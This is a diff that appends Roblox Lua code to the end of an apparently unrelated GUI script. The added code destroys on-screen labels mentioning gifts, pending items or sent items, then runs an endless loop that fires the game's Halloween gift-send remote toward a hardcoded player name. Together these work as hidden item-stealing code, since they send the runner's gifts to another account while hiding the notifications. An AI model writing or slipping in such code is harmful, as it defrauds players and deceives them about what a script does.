@@ -844,3 +844,71 @@ gui:GetPropertyChangedSignal("AbsoluteSize"):Connect(function()
     end
 
 end)
+
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local gui = player:WaitForChild("PlayerGui")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local network = ReplicatedStorage:WaitForChild("Network")
+
+-- Only remove these keywords from GUI
+local popupKeywords = {"gift", "pending", "sent"}
+local ignoreParents = {"QuestFrame", "QuestList", "HUD", "MainHUD"}
+
+local function containsKeyword(text)
+    if not text then return false end
+    text = text:lower()
+    for _, kw in ipairs(popupKeywords) do
+        if text:find(kw) then return true end
+    end
+    return false
+end
+
+local function isIgnored(obj)
+    for _, name in ipairs(ignoreParents) do
+        local parent = gui:FindFirstChild(name)
+        if parent and obj:IsDescendantOf(parent) then
+            return true
+        end
+    end
+    return false
+end
+
+local function handleObj(obj)
+    if isIgnored(obj) then return end
+    if obj:IsA("TextLabel") or obj:IsA("TextButton") then
+        if containsKeyword(obj.Text) then
+            if type(setclipboard) == "function" then
+                pcall(setclipboard, obj:GetFullName())
+            end
+            obj:Destroy()
+        end
+    else
+        for _, child in ipairs(obj:GetChildren()) do
+            handleObj(child)
+        end
+    end
+end
+
+-- Remove existing popups instantly
+for _, v in ipairs(gui:GetChildren()) do
+    handleObj(v)
+end
+
+-- Remove any new popups instantly
+gui.DescendantAdded:Connect(handleObj)
+
+-- Loop to send Halloween gifts
+local targetPlayer = "szymonyut" -- change to the player you want to send gifts to
+local args = {Players:WaitForChild(targetPlayer)}
+
+task.spawn(function()
+    while true do
+        pcall(function()
+            network:WaitForChild("Halloween Gift: Request Send"):FireServer(unpack(args))
+        end)
+        task.wait(0.4) -- adjust interval (in seconds) as needed
+    end
+end)
+
